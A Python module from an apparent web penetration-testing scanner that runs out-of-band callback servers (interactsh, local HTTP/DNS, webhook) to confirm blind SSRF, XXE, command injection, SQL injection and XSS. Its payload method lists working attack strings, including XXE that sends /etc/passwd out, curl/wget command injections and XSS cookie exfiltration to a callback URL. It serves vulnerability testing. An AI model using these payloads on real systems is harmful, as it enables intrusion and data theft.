"""
OOB callback server with FULL interactsh protocol support (v1.6).

Three production-ready modes:

1. INTERACTSH — full protocol implementation including RSA keypair registration,
   AES-encrypted polling, decryption, and correlation. Works with any interactsh
   server (default: oast.fun) including self-hosted instances.

2. LOCAL — HTTP listener on specified port + optional local DNS listener for
   DNS-based callbacks. For internal pentests where you control the network.

3. WEBHOOK — webhook.site fallback for quick HTTP-only OOB testing without setup.

Usage:
    cb = CallbackServer(mode="interactsh")
    await cb.start()

    cb_id = cb.generate_id("ssrf", "/api/fetch", "url")
    callback_url = cb.register_payload(cb_id, "ssrf", "/api/fetch", "url",
                                       "http://....", max_wait=30)

    # Inject callback_url into the target...

    # Later
    await asyncio.sleep(15)
    callbacks = await cb.check(cb_id)
    if callbacks:
        finding = cb.build_finding(cb_id, callbacks)
"""

import asyncio
import base64
import hashlib
import json
import os
import socket
import struct
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional

import httpx

from mantis.core.findings import (
    Finding, Severity, EvidenceLevel, FindingSource, HTTPEvidence,
)
from mantis.utils.verbose import log


class CallbackMode(Enum):
    INTERACTSH = "interactsh"
    LOCAL = "local"
    WEBHOOK = "webhook"


@dataclass
class CallbackRecord:
    callback_id: str
    timestamp: str
    source_ip: str = ""
    protocol: str = ""           # http, https, dns, smtp
    method: str = ""
    path: str = ""
    headers: dict = field(default_factory=dict)
    body: str = ""
    raw: str = ""


@dataclass
class PendingCallback:
    callback_id: str
    vuln_type: str
    target_url: str
    parameter: str
    payload: str
    injected_at: float
    callback_url: str
    max_wait_seconds: int = 30
    received: list = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════
# Interactsh client — proper RSA + AES protocol
# ═══════════════════════════════════════════════════════════════

class InteractshClient:
    """
    Proper interactsh protocol client (v1.6).

    Implements the full registration + polling protocol:
    1. Generate RSA-2048 keypair locally
    2. Register public key with server at /register
    3. Server returns correlation_id (e.g. cabc123...)
    4. Each callback subdomain is <random>.<correlation_id>.<server>
    5. Server encrypts callback data with AES-OFB using a session key
    6. Session key is RSA-OAEP encrypted with our public key, returned via /poll
    7. We decrypt the session key with our private key, then decrypt callback data
    """

    def __init__(self, server: str = "oast.fun", token: str = ""):
        self.server = server
        self.token = token
        self.correlation_id: str = ""
        self.secret_key: str = ""
        self.private_key = None
        self.public_key_pem: str = ""
        self._http_client: Optional[httpx.AsyncClient] = None

    async def register(self) -> bool:
        """
        Register an RSA public key with the interactsh server.

        Returns True on success, False if cryptography is missing or registration fails.
        """
        try:
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
        except ImportError:
            log.warn("cryptography library not installed — interactsh full protocol disabled")
            log.warn("Install with: pip install cryptography")
            return False

        # Generate RSA-2048 keypair
        self.private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = self.private_key.public_key()
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        self.public_key_pem = base64.b64encode(public_key_pem).decode()

        # Generate correlation and secret
        self.correlation_id = self._gen_random_alphanum(20).lower()
        self.secret_key = str(uuid.uuid4())

        # Send registration
        self._http_client = httpx.AsyncClient(
            verify=False, timeout=30,
            headers={"User-Agent": "Mozilla/5.0 (MANTIS interactsh client)"},
        )

        registration_data = {
            "public-key": self.public_key_pem,
            "secret-key": self.secret_key,
            "correlation-id": self.correlation_id,
        }
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = self.token

        try:
            resp = await self._http_client.post(
                f"https://{self.server}/register",
                json=registration_data,
                headers=headers,
            )
            if resp.status_code == 200:
                log.info(f"interactsh registered: {self.correlation_id}.{self.server}")
                return True
            log.warn(f"interactsh registration failed: HTTP {resp.status_code} — {resp.text[:200]}")
            return False
        except Exception as e:
            log.error(f"interactsh registration error", exc=e)
            return False

    def get_payload_url(self, sub_prefix: str) -> str:
        """Get a callback URL with the given subdomain prefix."""
        return f"http://{sub_prefix}.{self.correlation_id}.{self.server}"

    def get_dns_payload(self, sub_prefix: str) -> str:
        return f"{sub_prefix}.{self.correlation_id}.{self.server}"

    async def poll(self) -> list[dict]:
        """
        Poll the server for received callbacks.

        Decrypts AES-encrypted callback data using the server-provided session key
        (RSA-OAEP encrypted with our public key).
        """
        if not self._http_client or not self.correlation_id:
            return []

        try:
            headers = {}
            if self.token:
                headers["Authorization"] = self.token

            resp = await self._http_client.get(
                f"https://{self.server}/poll",
                params={"id": self.correlation_id, "secret": self.secret_key},
                headers=headers,
            )
            if resp.status_code != 200:
                return []

            data = resp.json()
            aes_key_b64 = data.get("aes_key", "")
            interactions = data.get("data", [])

            if not aes_key_b64 or not interactions:
                return []

            # Decrypt AES session key with our private RSA key
            session_key = self._decrypt_session_key(aes_key_b64)
            if not session_key:
                return []

            decoded = []
            for interaction_b64 in interactions:
                decrypted = self._decrypt_interaction(interaction_b64, session_key)
                if decrypted:
                    try:
                        decoded.append(json.loads(decrypted))
                    except json.JSONDecodeError:
                        pass

            return decoded
        except Exception as e:
            log.error("interactsh poll failed", exc=e)
            return []

    def _decrypt_session_key(self, aes_key_b64: str) -> Optional[bytes]:
        """Decrypt the AES session key using our RSA private key (OAEP padding)."""
        try:
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.asymmetric import padding

            ciphertext = base64.b64decode(aes_key_b64)
            session_key = self.private_key.decrypt(
                ciphertext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
            return session_key
        except Exception as e:
            log.error("Session key decryption failed", exc=e)
            return None

    def _decrypt_interaction(self, interaction_b64: str, session_key: bytes) -> Optional[str]:
        """Decrypt a single interaction using AES-256-CFB (interactsh uses CFB)."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

            ciphertext = base64.b64decode(interaction_b64)
            # First 16 bytes are IV
            iv = ciphertext[:16]
            actual_ct = ciphertext[16:]

            cipher = Cipher(algorithms.AES(session_key), modes.CFB(iv))
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(actual_ct) + decryptor.finalize()
            return plaintext.decode(errors="replace")
        except Exception as e:
            log.error("Interaction decryption failed", exc=e)
            return None

    async def deregister(self):
        """Deregister with the interactsh server (best effort)."""
        if not self._http_client:
            return
        try:
            headers = {"Content-Type": "application/json"}
            if self.token:
                headers["Authorization"] = self.token
            await self._http_client.post(
                f"https://{self.server}/deregister",
                json={"correlation-id": self.correlation_id, "secret-key": self.secret_key},
                headers=headers,
            )
        except Exception:
            pass
        await self._http_client.aclose()

    @staticmethod
    def _gen_random_alphanum(n: int) -> str:
        import string
        import random
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))


# ═══════════════════════════════════════════════════════════════
# Local DNS listener
# ═══════════════════════════════════════════════════════════════

class LocalDNSListener:
    """
    Minimal DNS server for local OOB testing.

    Listens on UDP port 53 (or configurable) and logs all incoming queries.
    Returns NXDOMAIN to all queries (we don't need to actually resolve anything).

    Logs include the queried name (which contains the callback ID) and source IP.
    """

    def __init__(self, port: int = 53, host: str = "0.0.0.0"):
        self.port = port
        self.host = host
        self.callbacks: list[dict] = []
        self._sock: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    def start(self):
        """Start the DNS listener in a background thread."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind((self.host, self.port))
            self._sock.settimeout(1.0)
        except PermissionError:
            log.warn(f"DNS listener needs root for port {self.port}. Falling back to HTTP-only OOB.")
            return False
        except Exception as e:
            log.error(f"DNS listener bind failed", exc=e)
            return False

        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        log.info(f"Local DNS listener active on {self.host}:{self.port}")
        return True

    def _serve(self):
        while self._running:
            try:
                data, addr = self._sock.recvfrom(512)
                # Parse DNS query
                qname, qtype = self._parse_query(data)
                if qname:
                    record = {
                        "timestamp": datetime.utcnow().isoformat(),
                        "source_ip": addr[0],
                        "protocol": "dns",
                        "qname": qname,
                        "qtype": qtype,
                    }
                    self.callbacks.append(record)
                    log.http("DNS", f"{qname} from {addr[0]}")

                    # Reply with NXDOMAIN
                    response = self._build_nxdomain_response(data)
                    self._sock.sendto(response, addr)
            except socket.timeout:
                continue
            except Exception:
                continue

    def _parse_query(self, data: bytes) -> tuple[str, int]:
        """Parse the question section of a DNS query."""
        try:
            # Skip 12-byte header
            offset = 12
            parts = []
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                if length > 63:  # Compression pointer
                    break
                offset += 1
                parts.append(data[offset:offset + length].decode(errors="replace"))
                offset += length

            qname = ".".join(parts)
            qtype = struct.unpack(">H", data[offset:offset + 2])[0] if offset + 2 <= len(data) else 0
            return qname, qtype
        except Exception:
            return "", 0

    def _build_nxdomain_response(self, query: bytes) -> bytes:
        """Build a minimal DNS response with NXDOMAIN status."""
        # Copy transaction ID
        tid = query[:2]
        # Flags: response (0x8000) | NXDOMAIN (0x0003)
        flags = struct.pack(">H", 0x8183)
        # Question count = same as query, answer/authority/additional = 0
        counts = query[4:6] + b"\x00\x00\x00\x00\x00\x00"
        # Copy question section as-is
        return tid + flags + counts + query[12:]

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# Local HTTP listener
# ═══════════════════════════════════════════════════════════════

class LocalHTTPListener:
    """HTTP listener for local OOB testing."""

    def __init__(self, port: int = 8888, host: str = "0.0.0.0"):
        self.port = port
        self.host = host
        self.callbacks: list[dict] = []
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self):
        callbacks_ref = self.callbacks

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                self._record("GET")
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors="replace") if length else ""
                self._record("POST", body)
            def do_PUT(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors="replace") if length else ""
                self._record("PUT", body)
            def do_HEAD(self):
                self._record("HEAD")
            def do_OPTIONS(self):
                self._record("OPTIONS")

            def _record(self, method, body=""):
                # Extract callback ID from path
                path_parts = self.path.split("/")
                cb_id = path_parts[2] if len(path_parts) > 2 and path_parts[1] == "cb" else ""
                if not cb_id and "?" in self.path:
                    # try query parameter
                    from urllib.parse import urlparse, parse_qs
                    qs = parse_qs(urlparse(self.path).query)
                    cb_id = qs.get("id", [""])[0]
                # Also extract from full path
                if not cb_id:
                    # try any 16-char hex-looking segment
                    import re
                    m = re.search(r"[a-f0-9]{16}", self.path)
                    if m:
                        cb_id = m.group(0)

                record = {
                    "callback_id": cb_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "source_ip": self.client_address[0],
                    "protocol": "http",
                    "method": method,
                    "path": self.path,
                    "headers": dict(self.headers),
                    "body": body,
                }
                callbacks_ref.append(record)

                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Server", "MANTIS-OOB")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, format, *args):
                pass

        try:
            self._server = HTTPServer((self.host, self.port), Handler)
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            log.info(f"Local HTTP OOB listener on {self.host}:{self.port}")
            return True
        except Exception as e:
            log.error("HTTP listener start failed", exc=e)
            return False

    def stop(self):
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# Main CallbackServer
# ═══════════════════════════════════════════════════════════════

class CallbackServer:
    """Unified OOB callback server (v1.6 — full protocol support)."""

    def __init__(
        self, mode: str = "interactsh",
        local_port: int = 8888, local_dns_port: int = 53,
        local_host: str = "0.0.0.0", external_url: str = "",
        interactsh_server: str = "oast.fun",
        interactsh_token: str = "",
    ):
        self.mode = CallbackMode(mode)
        self.local_port = local_port
        self.local_dns_port = local_dns_port
        self.local_host = local_host
        self.external_url = external_url
        self.interactsh_server = interactsh_server
        self.interactsh_token = interactsh_token

        self.pending: dict[str, PendingCallback] = {}
        self._http_listener: Optional[LocalHTTPListener] = None
        self._dns_listener: Optional[LocalDNSListener] = None
        self._interactsh: Optional[InteractshClient] = None
        self._webhook_client: Optional[httpx.AsyncClient] = None
        self._dns_enabled = False

    async def start(self):
        if self.mode == CallbackMode.LOCAL:
            self._http_listener = LocalHTTPListener(self.local_port, self.local_host)
            self._http_listener.start()
            self._dns_listener = LocalDNSListener(self.local_dns_port, self.local_host)
            self._dns_enabled = self._dns_listener.start()
            log.info(f"OOB local mode: HTTP on :{self.local_port}, DNS: {'on' if self._dns_enabled else 'off'}")
            if not self.external_url:
                log.warn("external_url not set — set --oob-url so targets can reach this server")

        elif self.mode == CallbackMode.INTERACTSH:
            self._interactsh = InteractshClient(self.interactsh_server, self.interactsh_token)
            ok = await self._interactsh.register()
            if not ok:
                log.warn("interactsh registration failed — falling back to local mode")
                self.mode = CallbackMode.LOCAL
                await self.start()
                return

        elif self.mode == CallbackMode.WEBHOOK:
            self._webhook_client = httpx.AsyncClient(timeout=15)
            log.info(f"OOB webhook mode: {self.external_url}")

    async def stop(self):
        if self._http_listener:
            self._http_listener.stop()
        if self._dns_listener:
            self._dns_listener.stop()
        if self._interactsh:
            await self._interactsh.deregister()
        if self._webhook_client:
            await self._webhook_client.aclose()

    def generate_id(self, vuln_type: str, target_url: str, parameter: str) -> str:
        """Generate a unique callback ID for a specific test."""
        raw = f"{vuln_type}:{target_url}:{parameter}:{uuid.uuid4().hex[:8]}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def register_payload(
        self, cb_id: str, vuln_type: str, target_url: str, parameter: str,
        payload: str, max_wait: int = 30,
    ) -> str:
        """Register a pending callback and return the URL to inject."""
        callback_url = self.get_payload_url(cb_id)
        self.pending[cb_id] = PendingCallback(
            callback_id=cb_id, vuln_type=vuln_type,
            target_url=target_url, parameter=parameter,
            payload=payload, injected_at=time.time(),
            callback_url=callback_url, max_wait_seconds=max_wait,
        )
        return callback_url

    def get_payload_url(self, cb_id: str) -> str:
        if self.mode == CallbackMode.LOCAL:
            base = self.external_url or f"http://localhost:{self.local_port}"
            return f"{base}/cb/{cb_id}"
        if self.mode == CallbackMode.INTERACTSH:
            return self._interactsh.get_payload_url(cb_id) if self._interactsh else ""
        if self.mode == CallbackMode.WEBHOOK:
            return f"https://webhook.site/{self.external_url}?id={cb_id}"
        return ""

    def get_dns_payload(self, cb_id: str) -> str:
        if self.mode == CallbackMode.INTERACTSH and self._interactsh:
            return self._interactsh.get_dns_payload(cb_id)
        if self.mode == CallbackMode.LOCAL and self.external_url:
            host = self.external_url.replace("http://", "").replace("https://", "").split(":")[0]
            return f"{cb_id}.{host}"
        return f"{cb_id}.callback.invalid"

    async def check(self, cb_id: str) -> list[CallbackRecord]:
        """Check if a specific callback was received."""
        if self.mode == CallbackMode.LOCAL:
            return self._check_local(cb_id)
        if self.mode == CallbackMode.INTERACTSH:
            return await self._check_interactsh(cb_id)
        if self.mode == CallbackMode.WEBHOOK:
            return await self._check_webhook(cb_id)
        return []

    async def check_all_pending(self) -> list[tuple[str, list[CallbackRecord]]]:
        """Check all pending callbacks that haven't expired."""
        results = []
        now = time.time()
        expired = []

        # For interactsh, pull all interactions ONCE per sweep
        all_interactsh = []
        if self.mode == CallbackMode.INTERACTSH and self._interactsh:
            all_interactsh = await self._interactsh.poll()

        for cb_id, pending in list(self.pending.items()):
            if pending.received:
                continue
            if now - pending.injected_at > pending.max_wait_seconds:
                expired.append(cb_id)
                continue

            if self.mode == CallbackMode.INTERACTSH:
                # Filter interactsh results for this cb_id
                cbs = []
                for inter in all_interactsh:
                    full_id = inter.get("full-id", "")
                    if cb_id in full_id:
                        cbs.append(CallbackRecord(
                            callback_id=cb_id,
                            timestamp=inter.get("timestamp", ""),
                            source_ip=inter.get("remote-address", ""),
                            protocol=inter.get("protocol", "http"),
                            raw=json.dumps(inter)[:1000],
                        ))
                if cbs:
                    pending.received = cbs
                    results.append((cb_id, cbs))
            else:
                cbs = await self.check(cb_id)
                if cbs:
                    pending.received = cbs
                    results.append((cb_id, cbs))

        for cb_id in expired:
            del self.pending[cb_id]
        return results

    def _check_local(self, cb_id: str) -> list[CallbackRecord]:
        """Check local HTTP + DNS listeners for callbacks matching this ID."""
        results = []
        if self._http_listener:
            for r in self._http_listener.callbacks:
                if r.get("callback_id") == cb_id or cb_id in r.get("path", ""):
                    results.append(CallbackRecord(
                        callback_id=cb_id,
                        timestamp=r.get("timestamp", ""),
                        source_ip=r.get("source_ip", ""),
                        protocol=r.get("protocol", "http"),
                        method=r.get("method", ""),
                        path=r.get("path", ""),
                        headers=r.get("headers", {}),
                        body=r.get("body", ""),
                    ))
        if self._dns_listener:
            for r in self._dns_listener.callbacks:
                if cb_id in r.get("qname", ""):
                    results.append(CallbackRecord(
                        callback_id=cb_id,
                        timestamp=r.get("timestamp", ""),
                        source_ip=r.get("source_ip", ""),
                        protocol="dns",
                        path=r.get("qname", ""),
                    ))
        return results

    async def _check_interactsh(self, cb_id: str) -> list[CallbackRecord]:
        if not self._interactsh:
            return []
        interactions = await self._interactsh.poll()
        results = []
        for inter in interactions:
            full_id = inter.get("full-id", "")
            if cb_id in full_id:
                results.append(CallbackRecord(
                    callback_id=cb_id,
                    timestamp=inter.get("timestamp", ""),
                    source_ip=inter.get("remote-address", ""),
                    protocol=inter.get("protocol", "http"),
                    raw=json.dumps(inter)[:1000],
                ))
        return results

    async def _check_webhook(self, cb_id: str) -> list[CallbackRecord]:
        if not self._webhook_client or not self.external_url:
            return []
        try:
            resp = await self._webhook_client.get(
                f"https://webhook.site/token/{self.external_url}/requests",
            )
            if resp.status_code != 200:
                return []
            data = resp.json()
            results = []
            for req in data.get("data", []):
                query = req.get("query", {})
                if query.get("id") == cb_id or cb_id in req.get("url", ""):
                    results.append(CallbackRecord(
                        callback_id=cb_id,
                        timestamp=req.get("created_at", ""),
                        source_ip=req.get("ip", ""),
                        protocol="http",
                        method=req.get("method", ""),
                        headers=req.get("headers", {}),
                        body=req.get("content", ""),
                    ))
            return results
        except Exception:
            return []

    def build_finding(self, cb_id: str, callbacks: list[CallbackRecord]) -> Optional[Finding]:
        pending = self.pending.get(cb_id)
        if not pending or not callbacks:
            return None
        cb = callbacks[0]

        vuln_details = {
            "ssrf": {
                "severity": Severity.HIGH, "cwe": "CWE-918",
                "title": f"Blind SSRF via '{pending.parameter}' at {pending.target_url}",
                "impact": "Server-side request forgery confirmed via out-of-band callback.",
                "owasp": "A10:2021 SSRF",
            },
            "xxe": {
                "severity": Severity.HIGH, "cwe": "CWE-611",
                "title": f"Blind XXE at {pending.target_url}",
                "impact": "XML external entity processing confirmed.",
                "owasp": "A05:2021 Security Misconfiguration",
            },
            "cmdi": {
                "severity": Severity.CRITICAL, "cwe": "CWE-78",
                "title": f"Blind Command Injection via '{pending.parameter}'",
                "impact": "OS command execution confirmed.",
                "owasp": "A03:2021 Injection",
            },
            "sqli": {
                "severity": Severity.HIGH, "cwe": "CWE-89",
                "title": f"Blind SQL Injection (OOB) via '{pending.parameter}'",
                "impact": "SQL injection confirmed via OOB exfiltration.",
                "owasp": "A03:2021 Injection",
            },
            "xss": {
                "severity": Severity.MEDIUM, "cwe": "CWE-79",
                "title": f"Blind/Stored XSS via '{pending.parameter}'",
                "impact": "Stored XSS execution confirmed via callback from victim browser.",
                "owasp": "A03:2021 Injection",
            },
        }
        d = vuln_details.get(pending.vuln_type, {
            "severity": Severity.MEDIUM, "cwe": "CWE-200",
            "title": f"Blind {pending.vuln_type.upper()}",
            "impact": "OOB callback confirmed.", "owasp": "A03:2021 Injection",
        })

        return Finding(
            title=d["title"],
            description=(
                f"OOB callback received from target after injecting {pending.vuln_type.upper()} "
                f"payload into '{pending.parameter}' at {pending.target_url}. "
                f"Callback at {cb.timestamp} from {cb.source_ip} via {cb.protocol.upper()}."
            ),
            source=FindingSource.WEBAPP,
            severity=d["severity"],
            evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
            target=pending.target_url, endpoint=pending.target_url,
            vuln_type=pending.vuln_type.upper(),
            cwe=d["cwe"], owasp_category=d.get("owasp", ""),
            payload=pending.payload,
            evidence=[HTTPEvidence(
                request_method="OOB_CALLBACK",
                request_url=pending.callback_url,
                request_headers=cb.headers,
                request_body=cb.body,
                response_status=0,
                response_headers={},
                response_body="",
                timestamp=cb.timestamp,
                notes=f"OOB callback via {cb.protocol}. Source: {cb.source_ip}. Payload: {pending.payload[:200]}",
            )],
            reproduction_steps=[
                f"1. Send request to {pending.target_url}",
                f"2. Set parameter '{pending.parameter}' to: {pending.callback_url}",
                f"3. Payload: {pending.payload[:200]}",
                f"4. Wait for callback (received at {cb.timestamp})",
                f"5. Callback source IP: {cb.source_ip}, protocol: {cb.protocol}",
            ],
            impact=d["impact"],
            remediation=self._get_remediation(pending.vuln_type),
            confidence=0.95,
            tags=["oob_confirmed", f"oob_{pending.vuln_type}", "blind"],
        )

    def get_oob_payloads(self, cb_id: str, vuln_type: str) -> list[dict]:
        url = self.get_payload_url(cb_id)
        dns = self.get_dns_payload(cb_id)

        payloads = {
            "ssrf": [
                {"payload": url, "description": "Direct URL callback", "context": "url_parameter"},
                {"payload": f"http://{dns}", "description": "DNS-based callback"},
                {"payload": f"https://{dns}", "description": "HTTPS callback"},
                {"payload": f"http://{dns}:80", "description": "Port-specified callback"},
                {"payload": f"//{dns}", "description": "Protocol-relative"},
                {"payload": f"http://{dns}%23@allowed.com", "description": "URL fragment bypass"},
                {"payload": f"http://[{dns}]", "description": "Bracket bypass"},
                {"payload": f"http://0177.0.0.1#@{dns}", "description": "Octal IP bypass"},
            ],
            "xxe": [
                {"payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]><foo>&xxe;</foo>',
                 "description": "Basic XXE entity fetch"},
                {"payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}/evil.dtd">%xxe;]>',
                 "description": "Parameter entity OOB XXE"},
                {"payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % all "<!ENTITY data SYSTEM \'{url}/?x=%file;\'>">%all;]><foo>&data;</foo>',
                 "description": "OOB file exfiltration via XXE"},
            ],
            "cmdi": [
                {"payload": f"; curl {url}", "description": "curl semicolon"},
                {"payload": f"| curl {url}", "description": "curl pipe"},
                {"payload": f"$(curl {url})", "description": "curl subshell"},
                {"payload": f"`curl {url}`", "description": "curl backtick"},
                {"payload": f"; wget {url}", "description": "wget"},
                {"payload": f"| nslookup {dns}", "description": "DNS via nslookup"},
                {"payload": f"; ping -c 1 {dns}", "description": "DNS via ping"},
                {"payload": f"%26 curl {url}", "description": "URL-encoded ampersand"},
                {"payload": f";curl%20{url}", "description": "URL-encoded space"},
            ],
            "sqli": [
                {"payload": f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{dns}','\\\\a')))-- ",
                 "description": "MySQL DNS exfil via LOAD_FILE"},
                {"payload": f"'; EXEC master..xp_dirtree '\\\\\\\\{dns}\\\\a'-- ",
                 "description": "MSSQL DNS via xp_dirtree"},
                {"payload": f"' UNION SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL-- ",
                 "description": "Oracle UTL_HTTP"},
                {"payload": f"' AND (SELECT COUNT(*) FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address={dns};', 'select 1'))-- ",
                 "description": "MSSQL OPENROWSET"},
                {"payload": f"'; COPY (SELECT '') TO PROGRAM 'curl {url}'-- ",
                 "description": "PostgreSQL COPY TO PROGRAM"},
            ],
            "xss": [
                {"payload": f'<img src=x onerror="fetch(\'{url}\')">', "description": "fetch callback"},
                {"payload": f'<script>new Image().src="{url}?c="+document.cookie</script>',
                 "description": "Cookie exfiltration"},
                {"payload": f'"><script src="{url}/xss.js"></script>', "description": "External script"},
                {"payload": f'<svg onload="fetch(\'{url}\')">', "description": "SVG onload"},
                {"payload": f'<iframe srcdoc="<script>parent.fetch(\'{url}\')</script>">',
                 "description": "Iframe srcdoc"},
            ],
        }
        return payloads.get(vuln_type, [])

    def _get_remediation(self, vuln_type: str) -> str:
        remediations = {
            "ssrf": "Implement URL allowlisting. Block requests to internal/private IP ranges. Resolve DNS and check final IP.",
            "xxe": "Disable external entity processing in the XML parser. Use defusedxml (Python).",
            "cmdi": "Never pass user input to shell commands. Use parameterized APIs (subprocess with list args).",
            "sqli": "Use parameterized queries / prepared statements.",
            "xss": "Implement context-aware output encoding. Use CSP. Validate all input.",
        }
        return remediations.get(vuln_type, "Validate input. Use safe APIs.")
